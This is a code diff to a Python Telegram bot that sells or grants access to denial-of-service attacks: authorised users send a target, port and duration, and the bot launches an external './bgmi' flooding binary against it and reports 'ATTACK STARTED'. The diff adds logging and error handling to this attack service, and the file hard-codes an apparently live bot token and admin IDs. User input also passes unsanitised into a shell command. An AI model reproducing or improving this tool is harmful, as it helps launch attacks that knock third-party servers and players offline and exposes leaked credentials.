@@ -6,10 +6,10 @@ import datetime
 import time
 import os
 
-# Insert your Telegram bot token here
+# insert your Telegram bot token here
 bot = telebot.TeleBot('7906423604:AAFuOK7mNjqsDKQqEjEmA9fH-RaXpn5z6Jo')
 
-# Admin user IDs
+# Admin user IDs (fixing the admin IDs as a list of strings)
 admin_id = ["5689106127", "6910445402", "5696319794"]
 
 # File to store allowed user IDs
@@ -18,8 +18,6 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
-# List to store allowed user IDs
-allowed_user_ids = []  # This should be populated by reading the USER_FILE
 
 # Function to read user IDs from the file
 def read_users():
@@ -29,6 +27,8 @@ def read_users():
     except FileNotFoundError:
         return []
 
+
+# List to store allowed user IDs
 allowed_user_ids = read_users()
 
 # Function to log command to the file
@@ -42,6 +42,21 @@ def log_command(user_id, target, port, time):
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
+
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
+
+
 # Function to handle the reply when free users run the /bgmi command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
@@ -50,8 +65,12 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @Indivual1X"
     bot.reply_to(message, response)
 
+
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
+
+COOLDOWN_TIME = 0
+
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -86,23 +105,28 @@ def handle_bgmi(message):
             # Full command to run the BGMI attack (you need to update it according to your BGMI attack command)
             full_command = f"./bgmi {target} {port} {time_duration} 500"
 
-            # Run the BGMI command in the background using subprocess.Popen
-            process = subprocess.Popen(full_command, shell=True)
+            try:
+                # Run the BGMI command in the background using subprocess.Popen
+                process = subprocess.Popen(full_command, shell=True)
+                print(f"Attack started: {full_command}")
 
-            # Sleep for the specified duration to allow the attack to run
-            time.sleep(time_duration)
+                # Sleep for the specified duration to allow the attack to run
+                time.sleep(time_duration)
 
-            # Terminate the attack after the specified time duration
-            process.terminate()
+                # Terminate the attack after the specified time duration
+                process.terminate()
 
-            # Send a message when the attack is finished
-            bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration} seconds.")
+                # Send a message when the attack is finished
+                bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration} seconds.")
+            except Exception as e:
+                bot.reply_to(message, f"Error occurred while executing attack: {str(e)}")
         else:
             response = "Usage: /bgmi <target> <port> <time>\nBy @Indivual1X"
             bot.reply_to(message, response)
     else:
         response = "You Are Not Authorized To Use This Command.\nBy @Indivual1X"
         bot.reply_to(message, response)
+
 
 # Admin Commands Handlers
 @bot.message_handler(commands=['add'])
@@ -125,6 +149,7 @@ def add_user(message):
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
 
+
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
     user_id = str(message.chat.id)
@@ -146,6 +171,7 @@ def remove_user(message):
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
 
+
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
     user_id = str(message.chat.id)
@@ -164,5 +190,9 @@ def clear_logs_command(message):
         response = "Only Admin Can Run This Command."
     bot.reply_to(message, response)
 
+
 # Polling the bot
-bot.polling()
+try:
+    bot.polling()
+except Exception as e:
+    print(f"Error in bot polling: {str(e)}")
